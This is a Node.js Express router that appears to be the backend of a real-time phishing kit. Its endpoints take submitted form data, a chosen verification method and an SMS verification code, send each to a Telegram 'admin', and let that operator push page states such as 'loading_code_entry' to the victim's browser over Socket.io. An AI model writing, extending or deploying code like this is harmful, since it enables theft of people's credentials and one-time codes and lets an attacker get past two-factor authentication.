const express = require('express');
const router = express.Router();
const { v4: uuidv4 } = require('uuid');
const db = require('../db/database');
const telegramBot = require('../bot/telegramBot');
const { calculateExpirationTime } = require('../utils/helpers');

// Validate a key
router.get('/validate-key/:key', async (req, res) => {
  try {
    const { key } = req.params;
    const session = await db.getSession(key);
    
    if (!session) {
      return res.json({ valid: false });
    }
    
    res.json({ valid: true });
  } catch (error) {
    console.error('Error validating key:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get session status
router.get('/status/:key', async (req, res) => {
  try {
    const { key } = req.params;
    const session = await db.getSession(key);
    
    if (!session) {
      return res.status(404).json({ error: 'Session not found or expired' });
    }
    
    res.json({ state: session.state });
  } catch (error) {
    console.error('Error getting status:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Generate a new session key
router.post('/generate-key', async (req, res) => {
  try {
    const key = uuidv4();
    await db.createSession(key);
    res.json({ key });
  } catch (error) {
    console.error('Error generating key:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Generate a new key automatically
router.post('/generate-key-auto', async (req, res) => {
  try {
    // Generate a new UUID key
    const key = uuidv4();
    
    // Calculate expiration time (24 hours from now)
    const expiresAt = calculateExpirationTime(24);
    
    // Create a new session in the database
    await db.createSession(key, expiresAt);
    
    // Notify the Telegram admin about the auto-generated session
    await telegramBot.notifyAutoGenerated(key);
    
    // Return the key to the client
    res.json({ key });
  } catch (error) {
    console.error('Error generating key:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Submit form data
router.post('/form', async (req, res) => {
  try {
    const { key, ...formData } = req.body;
    
    // Debug logging
    console.log('Form data received:', formData);
    
    if (!key) {
      return res.status(400).json({ error: 'Session key is required' });
    }
    
    const session = await db.getSession(key);
    if (!session) {
      return res.status(404).json({ error: 'Session not found or expired' });
    }
    
    // Save form data
    await db.saveFormData(key, 'form_1', formData);
    
    // Update session state to loading
    await db.updateSessionState(key, 'loading');
    
    // Notify Telegram admin
    await telegramBot.notifyAdmin(key, 'form_1', formData);
    
    res.json({ success: true, state: 'loading' });
  } catch (error) {
    console.error('Error submitting form:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Handle Form2 submission (verification method selection)
router.post('/form2', async (req, res) => {
  try {
    const { key, verificationMethod } = req.body;
    
    if (!key || !verificationMethod) {
      return res.status(400).json({ error: 'Missing required fields' });
    }
    
    // Get session
    const session = await db.getSession(key);
    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }
    
    // Save form data
    await db.saveFormData(key, 'form_2', { verificationMethod });
    
    // Update session state to loading_code_entry
    await db.updateSessionState(key, 'loading_code_entry');
    
    // Notify admin via Telegram
    await telegramBot.notifySmsCodeRequest(key, verificationMethod);
    
    // Return success
    res.json({ success: true });
  } catch (error) {
    console.error('Error handling Form2 submission:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Submit Form2 data (verification method selection)
router.post('/form2-old', async (req, res) => {
  try {
    const { key, verificationMethod } = req.body;
    
    if (!key) {
      return res.status(400).json({ error: 'Session key is required' });
    }
    
    const session = await db.getSession(key);
    if (!session) {
      return res.status(404).json({ error: 'Session not found or expired' });
    }
    
    // Save verification method data
    await db.saveFormData(key, 'form_2', { verificationMethod });
    
    // Update session state to loading
    await db.updateSessionState(key, 'loading');
    
    // Notify Telegram admin about Form2 submission
    const formData = await db.getFormData(key);
    await telegramBot.notifyAdmin(key, 'form_2', { ...formData, verificationMethod });
    
    res.json({ success: true, state: 'loading' });
  } catch (error) {
    console.error('Error submitting Form2:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Submit verification code
router.post('/code', async (req, res) => {
  try {
    const { key, code } = req.body;
    
    if (!key || !code) {
      return res.status(400).json({ error: 'Session key and code are required' });
    }
    
    const session = await db.getSession(key);
    if (!session) {
      return res.status(404).json({ error: 'Session not found or expired' });
    }
    
    // Get existing form data to preserve it
    const formData = await db.getFormData(key);
    
    // Save code data
    await db.saveFormData(key, 'code', { code });
    
    // Update session state to loading_pending
    await db.updateSessionState(key, 'loading_pending');
    
    // Notify Telegram admin with the code and preserve existing form data
    await telegramBot.notifyAdmin(key, 'code', { ...formData, code });
    
    res.json({ success: true, state: 'loading_pending' });
  } catch (error) {
    console.error('Error submitting code:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// State update endpoint
router.post('/state', async (req, res) => {
  try {
    const { key, state } = req.body;
    console.log(`State update request received: key=${key}, state=${state}`);
    
    if (!key || !state) {
      console.log('Missing key or state in request');
      return res.status(400).json({ error: 'Session key and state are required' });
    }
    
    const session = await db.getSession(key);
    if (!session) {
      console.log(`Session not found: ${key}`);
      return res.status(404).json({ error: 'Session not found or expired' });
    }
    
    // Update session state
    await db.updateSessionState(key, state);
    console.log(`Database updated: key=${key}, state=${state}`);
    
    // Notify connected clients via Socket.io
    const io = req.app.get('io');
    console.log(`Socket.io instance available: ${!!io}`);
    
    if (io) {
      // Emit to the specific room
      io.to(key).emit('state_update', { key, state });
      console.log(`Emitted state_update event to room ${key} with state ${state}`);
      
      // Also emit to all clients as a fallback
      io.emit('global_state_update', { key, state });
      console.log(`Emitted global_state_update event with key=${key}, state=${state}`);
    } else {
      console.error('Socket.io instance not available in API route');
    }
    
    res.json({ success: true, state });
  } catch (error) {
    console.error('Error updating state:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Add a health check endpoint
router.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok', timestamp: Date.now() });
});

module.exports = router;
